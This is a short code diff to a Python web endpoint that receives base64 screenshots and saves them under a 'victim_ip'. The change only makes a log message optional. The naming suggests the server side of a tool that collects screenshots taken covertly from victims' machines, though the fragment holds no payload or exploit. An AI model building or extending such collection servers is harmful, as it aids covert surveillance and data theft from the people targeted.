@@ -97,7 +97,8 @@ def handle_post():
 
         if screenshot_base64:
             save_screenshot(screenshot_base64, victim_ip)
-            logger.info(f"Screenshot saved from {victim_ip}")
+            if show_screenshot_logs:
+                logger.info(f"Screenshot saved from {victim_ip}")
 
         return jsonify({'status': 'success', 'message': 'Data received and saved successfully'}), 200
 
